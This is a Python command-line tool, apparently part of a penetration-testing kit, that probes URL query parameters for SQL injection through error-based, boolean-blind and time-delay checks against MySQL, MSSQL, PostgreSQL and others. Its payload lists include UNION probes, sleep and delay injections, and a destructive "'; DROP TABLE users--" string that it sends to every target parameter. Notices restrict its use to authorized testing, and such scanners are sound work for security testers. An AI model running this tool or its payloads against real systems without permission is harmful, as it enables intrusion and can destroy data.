#!/usr/bin/env python3
"""
sqli_detector.py — SQL Injection Vulnerability Detector
Part of pentest-toolkit by [Your Name]

LEGAL NOTICE: This tool is for authorized penetration testing ONLY.
Only use against systems you own or have explicit written permission to test.
Unauthorized use is illegal and unethical.
"""

import argparse
import io
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console(highlight=False)

# ── Payloads ──────────────────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR '1'='1' --",
    '" OR "1"="1',
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "'; DROP TABLE users--",
    "1; SELECT SLEEP(0)--",
]

BLIND_PAYLOADS = [
    ("' AND 1=1--",  "' AND 1=2--"),   # boolean-based pair
    ("' AND 'a'='a", "' AND 'a'='b"),
]

TIME_PAYLOADS = [
    ("' OR SLEEP(3)--",          3),   # MySQL
    ("'; WAITFOR DELAY '0:0:3'--", 3), # MSSQL
    ("' OR pg_sleep(3)--",        3),  # PostgreSQL
]

# ── Error signatures per DB ───────────────────────────────────────────────────

DB_ERRORS = {
    "MySQL":      ["you have an error in your sql syntax", "warning: mysql", "mysql_fetch"],
    "PostgreSQL": ["pg_query()", "pg_exec()", "postgresql", "unterminated quoted string"],
    "MSSQL":      ["unclosed quotation mark", "microsoft sql server", "odbc sql server"],
    "Oracle":     ["ora-", "oracle error", "quoted string not properly terminated"],
    "SQLite":     ["sqlite3::", "sqlite_error", "unrecognized token"],
    "Generic":    ["sql syntax", "sql error", "database error", "syntax error"],
}

# ── Result storage ────────────────────────────────────────────────────────────

class Finding:
    def __init__(self, url, param, payload, vuln_type, db_type=None, evidence=None):
        self.url       = url
        self.param     = param
        self.payload   = payload
        self.vuln_type = vuln_type
        self.db_type   = db_type or "Unknown"
        self.evidence  = evidence or ""

    def __repr__(self):
        return f"[{self.vuln_type}] {self.url} | param={self.param} | db={self.db_type}"


# ── Core detection logic ──────────────────────────────────────────────────────

def get_params(url: str) -> dict:
    """Extract query parameters from a URL."""
    parsed = urllib.parse.urlparse(url)
    return dict(urllib.parse.parse_qsl(parsed.query))


def inject_param(url: str, param: str, payload: str) -> str:
    """Return URL with a single parameter replaced by the payload."""
    parsed   = urllib.parse.urlparse(url)
    params   = dict(urllib.parse.parse_qsl(parsed.query))
    params[param] = payload
    new_query = urllib.parse.urlencode(params)
    return parsed._replace(query=new_query).geturl()


def detect_db_from_error(body: str) -> str:
    body_lower = body.lower()
    for db, signatures in DB_ERRORS.items():
        if any(sig in body_lower for sig in signatures):
            return db
    return "Unknown"


def check_error_based(client: httpx.Client, url: str, param: str, baseline: str) -> list[Finding]:
    findings = []
    for payload in ERROR_PAYLOADS:
        test_url = inject_param(url, param, payload)
        try:
            resp = client.get(test_url, timeout=10)
            body = resp.text
            db   = detect_db_from_error(body)

            # check for DB error strings
            body_lower = body.lower()
            all_sigs   = [s for sigs in DB_ERRORS.values() for s in sigs]
            if any(sig in body_lower for sig in all_sigs):
                findings.append(Finding(
                    url=url, param=param, payload=payload,
                    vuln_type="Error-based SQLi",
                    db_type=db,
                    evidence=f"DB error detected in response"
                ))
                break  # one confirmed finding per param is enough
        except httpx.RequestError:
            pass
    return findings


def check_boolean_based(client: httpx.Client, url: str, param: str, baseline: str) -> list[Finding]:
    findings = []
    for (true_payload, false_payload) in BLIND_PAYLOADS:
        try:
            true_url  = inject_param(url, param, true_payload)
            false_url = inject_param(url, param, false_payload)

            true_resp  = client.get(true_url,  timeout=10)
            false_resp = client.get(false_url, timeout=10)

            # significant length difference = different DB responses = boolean SQLi
            len_diff = abs(len(true_resp.text) - len(false_resp.text))
            base_len = len(baseline) or 1

            if len_diff > 50 and (len_diff / base_len) > 0.05:
                findings.append(Finding(
                    url=url, param=param, payload=true_payload,
                    vuln_type="Boolean-based blind SQLi",
                    evidence=f"Response length diff: {len_diff} chars"
                ))
                break
        except httpx.RequestError:
            pass
    return findings


def check_time_based(client: httpx.Client, url: str, param: str, baseline_time: float) -> list[Finding]:
    findings = []
    for (payload, expected_delay) in TIME_PAYLOADS:
        test_url = inject_param(url, param, payload)
        try:
            start = time.time()
            client.get(test_url, timeout=expected_delay + 5)
            elapsed = time.time() - start

            if elapsed >= expected_delay * 0.8:  # 20% tolerance
                findings.append(Finding(
                    url=url, param=param, payload=payload,
                    vuln_type="Time-based blind SQLi",
                    evidence=f"Response delayed {elapsed:.1f}s (expected ≥{expected_delay}s)"
                ))
                break
        except httpx.TimeoutException:
            # timeout itself can confirm time-based injection
            findings.append(Finding(
                url=url, param=param, payload=payload,
                vuln_type="Time-based blind SQLi",
                evidence=f"Request timed out — possible time injection"
            ))
            break
        except httpx.RequestError:
            pass
    return findings


# ── Scanner orchestrator ──────────────────────────────────────────────────────

def scan_url(url: str, checks: list[str], headers: dict, cookies: dict) -> list[Finding]:
    params = get_params(url)
    if not params:
        console.print(f"[yellow]  No query parameters found in URL: {url}[/yellow]")
        return []

    all_findings = []

    with httpx.Client(headers=headers, cookies=cookies, follow_redirects=True) as client:
        # baseline request
        try:
            base_resp      = client.get(url, timeout=10)
            baseline_body  = base_resp.text
            baseline_start = time.time()
            client.get(url, timeout=10)
            baseline_time  = time.time() - baseline_start
        except httpx.RequestError as e:
            console.print(f"[red]  Could not reach {url}: {e}[/red]")
            return []

        for param in params:
            console.print(f"  [dim]Testing parameter:[/dim] [cyan]{param}[/cyan]")

            if "error" in checks:
                all_findings += check_error_based(client, url, param, baseline_body)
            if "boolean" in checks:
                all_findings += check_boolean_based(client, url, param, baseline_body)
            if "time" in checks:
                all_findings += check_time_based(client, url, param, baseline_time)

    return all_findings


# ── Output ────────────────────────────────────────────────────────────────────

def print_findings(findings: list[Finding]):
    if not findings:
        console.print(Panel("[green]No SQL injection vulnerabilities detected.[/green]", title="Result"))
        return

    table = Table(
        title=f"[bold red]{len(findings)} Vulnerability(ies) Found[/bold red]",
        box=box.ROUNDED,
        show_lines=True
    )
    table.add_column("Type",      style="red",    no_wrap=True)
    table.add_column("Parameter", style="cyan",   no_wrap=True)
    table.add_column("DB",        style="yellow", no_wrap=True)
    table.add_column("Payload",   style="magenta")
    table.add_column("Evidence",  style="dim")

    for f in findings:
        table.add_row(f.vuln_type, f.param, f.db_type, f.payload, f.evidence)

    console.print(table)


# ── CLI ───────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="SQLi Detector — part of pentest-toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python sqli_detector.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
  python sqli_detector.py -u "http://example.com/page?id=1" --checks error boolean
  python sqli_detector.py -u "http://example.com/page?id=1" -H "X-Auth: token123"
  python sqli_detector.py -l urls.txt --checks all

⚠  Only test systems you own or have explicit written permission to test.
        """
    )
    parser.add_argument("-u",  "--url",     help="Target URL with query parameters")
    parser.add_argument("-l",  "--list",    help="File containing list of URLs (one per line)")
    parser.add_argument(
        "--checks",
        nargs="+",
        choices=["error", "boolean", "time", "all"],
        default=["error", "boolean"],
        help="Which injection checks to run (default: error boolean)"
    )
    parser.add_argument("-H", "--header",   action="append", default=[],
                        help="Custom header (e.g. 'Authorization: Bearer token')")
    parser.add_argument("-c", "--cookie",   action="append", default=[],
                        help="Cookie (e.g. 'session=abc123')")
    parser.add_argument("-t", "--threads",  type=int, default=5,
                        help="Threads for multi-URL scanning (default: 5)")
    parser.add_argument("-o", "--output",   help="Save findings to a text file")
    return parser.parse_args()


def main():
    args = parse_args()

    console.print(Panel.fit(
        "[bold red]pentest-toolkit[/bold red] [white]//[/white] [cyan]SQLi Detector[/cyan]\n"
        "[dim]For authorized testing only[/dim]",
        border_style="red"
    ))

    # resolve checks
    checks = ["error", "boolean", "time"] if "all" in args.checks else args.checks

    # parse headers and cookies
    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    cookies = {}
    for c in args.cookie:
        if "=" in c:
            k, v = c.split("=", 1)
            cookies[k.strip()] = v.strip()

    # collect URLs
    urls = []
    if args.url:
        urls.append(args.url)
    if args.list:
        try:
            with open(args.list) as f:
                urls += [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            console.print(f"[red]File not found: {args.list}[/red]")
            sys.exit(1)

    if not urls:
        console.print("[red]No target URL(s) provided. Use -u or -l.[/red]")
        sys.exit(1)

    all_findings = []

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                  console=console) as progress:
        task = progress.add_task("Scanning...", total=len(urls))

        def run(url):
            progress.update(task, description=f"Scanning {url[:60]}...")
            return scan_url(url, checks, headers, cookies)

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(run, u): u for u in urls}
            for future in as_completed(futures):
                all_findings += future.result()
                progress.advance(task)

    console.print()
    print_findings(all_findings)

    # optional file output
    if args.output and all_findings:
        with open(args.output, "w") as f:
            for finding in all_findings:
                f.write(str(finding) + "\n")
        console.print(f"\n[green]Findings saved to {args.output}[/green]")


if __name__ == "__main__":
    main()